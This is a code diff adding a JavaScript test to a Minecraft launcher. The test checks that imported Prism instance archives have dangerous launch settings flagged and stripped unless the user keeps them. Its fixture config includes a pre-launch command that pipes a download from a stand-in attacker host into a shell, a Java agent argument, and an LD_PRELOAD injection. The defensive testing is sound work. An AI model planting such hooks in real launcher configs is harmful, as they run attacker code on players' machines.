@@ -260,3 +260,49 @@ test('meta: versions and loaders from Prism meta', async () => {
   const loaders = await meta.loadersFor('26.2');
   assert.ok(loaders.includes('fabric'));
 });
+
+// A Prism instance someone exported can bring settings that run something on
+// this computer when the game starts. They are listed before importing it, and
+// stay only if the person chooses so.
+test('prism zip: settings that run something are found, and dropped unless kept', async () => {
+  const { riskyLaunchSettings } = require('../src/main/prism/launchsettings');
+  const cfg = [
+    '[General]',
+    'ConfigVersion=1.3',
+    'InstanceType=OneSix',
+    'name=Shared',
+    'OverrideCommands=true',
+    'PreLaunchCommand=curl https://evil.example/x | sh',
+    'OverrideJavaArgs=true',
+    'JvmArgs=-Xmx4G -javaagent:agent.jar',
+    'OverrideEnv=true',
+    'Env="{\\"LD_PRELOAD\\":\\"/tmp/x.so\\",\\"MESA_GL_VERSION_OVERRIDE\\":\\"4.5\\"}"',
+    'OverrideMemory=true',
+    'MaxMemAlloc=4096',
+  ].join('\n');
+  const file = path.join(tmp, 'shared-instance.zip');
+  await require('../src/main/util/zip').writeZip(file, [
+    { name: 'Shared/instance.cfg', buffer: Buffer.from(cfg) },
+    { name: 'Shared/mmc-pack.json', buffer: Buffer.from(JSON.stringify({ formatVersion: 1, components: [{ uid: 'net.minecraft', version: '26.2' }] })) },
+  ]);
+  const found = await modpacks.archiveLaunchSettings(file);
+  assert.deepEqual(found.map((f) => f.key), ['PreLaunchCommand', 'JvmArgs', 'Env LD_PRELOAD']);
+
+  // without an answer (or "drop"): imported without them, the rest stays
+  const dropped = await modpacks.importArchive(file, {});
+  const c1 = await IniFile.load(path.join((await instances.get(dropped.id)).root, 'instance.cfg'));
+  assert.deepEqual(riskyLaunchSettings(c1), []);
+  assert.equal(c1.get('PreLaunchCommand', ''), '');
+  assert.equal(String(c1.get('MaxMemAlloc')), '4096');
+  assert.match(String(c1.get('Env')), /MESA_GL_VERSION_OVERRIDE/);
+  assert.doesNotMatch(String(c1.get('Env')), /LD_PRELOAD/);
+
+  // "keep": as it came
+  const kept = await modpacks.importArchive(file, { launchSettings: 'keep' });
+  const c2 = await IniFile.load(path.join((await instances.get(kept.id)).root, 'instance.cfg'));
+  assert.equal(riskyLaunchSettings(c2).length, 3);
+
+  // modpacks have no instance.cfg: nothing to ask
+  const mr = path.join(tmp, 'fo.mrpack');
+  if (fs.existsSync(mr)) assert.deepEqual(await modpacks.archiveLaunchSettings(mr), []);
+});
